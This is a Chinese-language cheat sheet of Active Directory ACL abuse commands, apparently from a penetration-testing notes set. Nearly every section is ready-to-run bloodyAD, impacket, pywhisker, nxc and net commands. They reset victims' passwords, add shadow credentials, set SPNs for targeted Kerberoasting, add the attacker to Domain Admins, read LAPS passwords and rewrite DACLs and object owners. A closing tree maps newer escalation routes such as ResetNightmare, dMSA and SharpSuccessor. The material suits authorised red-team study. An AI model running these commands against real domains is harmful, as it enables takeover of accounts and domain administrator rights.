# ACL 滥用场景 + 命令

---

## 枚举ACL

```
# BloodyAD（首选，从Kali执行）
bloodyAD --host DC-IP -d corp.com -u jen -p 'pass' get writable --right ALL
bloodyAD ... get writable --right WRITE --otype user
bloodyAD ... get writable --right WRITE --otype group

# impacket dacledit
impacket-dacledit -action read -target '<target>' corp.com/jen:'pass'

# BloodHound → 找 GenericAll/WriteDACL/Owns 等边
```

## GenericAll

### 对用户
```
# 改密码（BloodyAD，从Kali执行）
bloodyAD --host DC-IP -d corp.com -u jen -p 'pass' set password victim 'NewPass123!'

# 设SPN后Kerberoast（目标化Kerberoast）
bloodyAD --host DC-IP -d corp.com -u jen -p 'pass' set object victim servicePrincipalName -v 'fake/spn'
impacket-GetUserSPNs corp.com/jen:'pass' -dc-ip DC-IP -request -target-user victim
bloodyAD ... set object victim servicePrincipalName               # 清理（清空SPN）

# Shadow Credentials
bloodyAD --host DC-IP -d corp.com -u jen -p 'pass' add shadowCredentials victim
# 或 pywhisker
python3 pywhisker.py -d corp.com -u jen -p 'pass' --target victim --action add
```

### 对组
```
# 加自己进组（BloodyAD）
bloodyAD --host DC-IP -d corp.com -u jen -p 'pass' add groupMember 'Domain Admins' jen

# 或 net命令（域内Windows）
net group "Domain Admins" jen /add /domain
```

### 对计算机
```
# RBCD（见kerberos-attacks.md 5.4）

# 读 LAPS：legacy + Windows LAPS，完整 schema/rights 见 ../../ad-recon/references/windows-laps.md
nxc ldap DC-IP -u jen -p 'pass' -M laps
bloodyAD --host DC-IP -d corp.com -u jen -p 'pass' get object 'TARGET$' --attr ms-Mcs-AdmPwd
bloodyAD --host DC-IP -d corp.com -u jen -p 'pass' get object 'TARGET$' --attr msLAPS-Password
# encrypted Windows LAPS material 由有权限的 Windows LAPS cmdlet 读取/解密
```

## GenericWrite

```
# 对用户 → 设SPN后Kerberoast（同上）或Shadow Credentials
# 对计算机 → RBCD
# 对GPO → GPO abuse（加本地管理员等）
```

## WriteDACL

```
# impacket dacledit（首选，从Kali执行）
impacket-dacledit corp.com/jen:'pass' -action write -rights FullControl -principal jen -target "Domain Admins"
# 然后按GenericAll利用

# BloodyAD
bloodyAD --host DC-IP -d corp.com -u jen -p 'pass' add genericAll 'CN=Domain Admins,CN=Users,DC=corp,DC=com' jen
```

## WriteOwner

```
# impacket owneredit
impacket-owneredit -action write -owner jen -target 'Domain Admins' corp.com/jen:'pass'
# 然后WriteDACL给自己加权限
impacket-dacledit corp.com/jen:'pass' -action write -rights FullControl -principal jen -target "Domain Admins"

# BloodyAD
bloodyAD --host DC-IP -d corp.com -u jen -p 'pass' set owner 'Domain Admins' jen
```

## ForceChangePassword

```
# BloodyAD（首选）
bloodyAD --host DC-IP -d corp.com -u jen -p 'pass' set password victim 'NewPass!'

# impacket
impacket-changepasswd corp.com/victim@DC-IP -newpass 'NewPass!'
```

## Self（Self-Membership）

```
# BloodyAD
bloodyAD --host DC-IP -d corp.com -u jen -p 'pass' add groupMember 'Target Group' jen

# net命令
net group "Target Group" jen /add /domain
```

---

## 现代ACL路由（2025-2026）

传统GenericWrite/GenericAll之外，再检查：

```
GenericWrite/GenericAll on User/Computer
  ├─ Shadow Credentials
  ├─ Targeted Kerberoast（User）
  └─ ResetNightmare（CVE-2026-27912，只有未修补DC）

CreateChild/GenericAll on OU
  ├─ 可创建受控User/Computer → ResetNightmare候选（未修补）
  └─ Server 2025 DC → dMSA候选

CreateChild OU + Write target User/Computer
  → post-patch SharpSuccessor候选
```

ResetNightmare会真实改变目标密码 → `identity-confusion.md`。

dMSA → `dmsa.md`。
